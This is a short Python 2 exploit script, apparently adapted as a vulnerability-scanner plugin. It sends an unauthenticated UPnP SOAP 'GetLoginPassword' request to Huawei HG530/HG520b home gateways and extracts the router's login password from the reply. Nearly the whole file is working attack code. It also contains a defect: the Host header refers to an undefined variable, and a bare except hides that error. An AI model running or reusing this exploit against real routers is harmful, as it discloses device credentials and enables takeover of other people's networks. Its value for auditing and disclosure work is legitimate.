#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
# Exploit Title: Huawei Home Gateway password disclosure
# Date: June 27, 2015
# Exploit Author: Fady Mohamed Osman (@fady_osman)
# Vendor Homepage: http://www.huawei.com/en/
# Software Link: N/A.
# Version: UPnP/1.0 IGD/1.00
# Tested on: HG530 - HG520b (Provided by TE-DATA egypt)
# Exploit-db : http://www.exploit-db.com/author/?a=2986
# Youtube : https://www.youtube.com/user/cutehack3r
 
import re
import urlparse
import socket
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    arr = urlparse.urlparse(arg)
    port=80
    host=arr.netloc
    if ':' in host:
        host_port=host.split(':')
        host=host_port[0]
        port=int(host_port[1])
    try:    
        hahasend(host,port)
    except:
        pass


def hahasend(host,port):
    timeout = 20
    socket.setdefaulttimeout(timeout)
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((host,port))
    soap = "<?xml version=\"1.0\"?>"
    soap +="<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    soap +="<s:Body>"
    soap +="<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
    soap +="</m:GetLoginPassword>"
    soap +="</s:Body>"
    soap +="</s:Envelope>"
    message = "POST /UD/?5 HTTP/1.1\r\n"
    message += "SOAPACTION: \"urn:dslforum-org:service:UserInterface:1#GetLoginPassword\"\r\n"
    message += "Content-Type: text/xml; charset=\"utf-8\"\r\n"
    message += "Host:" + target_host + "\r\n"
    message += "Content-Length:" + str(len(soap)) +"\r\n"
    message += "Expect: 100-continue\r\n"
    message += "Connection: Keep-Alive\r\n\r\n"
    sock.send(message)
    data = sock.recv(1024)
    sock.send(soap)
    data = sock.recv(1024)
    data += sock.recv(1024)
    #print data

    r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
    m = r.search(data)
    if m:
        security_hole("Huawei Home Gateway UPnP/1.0 IGD/1.00 Password Disclosure Exploit",host)




if __name__ == '__main__': 
    from dummy import * 
    audit(assign('www', 'http://www.example.com/')[1])